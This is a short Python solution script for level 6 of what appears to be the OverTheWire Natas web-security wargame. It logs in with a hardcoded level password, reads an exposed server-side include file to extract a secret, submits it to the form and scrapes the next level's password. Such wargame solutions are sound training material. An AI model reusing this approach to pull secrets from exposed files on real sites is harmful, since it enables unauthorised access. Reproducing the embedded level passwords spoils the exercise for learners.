# -*- coding: utf-8 -*-
from base import get_page, post_page
import re

def natas6():
    username = "natas6"
    password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

    secret_content = get_page(6, username, password, "/includes/secret.inc")
    secret = re.search(r"(?<=secret = \")\w+", secret_content)
    if secret is None:
        print("Fail to find password")
        return
    secret = secret.group(0)
    data={"secret": secret,"submit": "Submit"}
    content = post_page(6, username, password, data=data)
    password = re.search(r"(?<=The password for natas7 is )\w+", content)
    if password is None:
        print("Fail to find password")
        return
    print(password.group(0))


if __name__ == "__main__":
    natas6()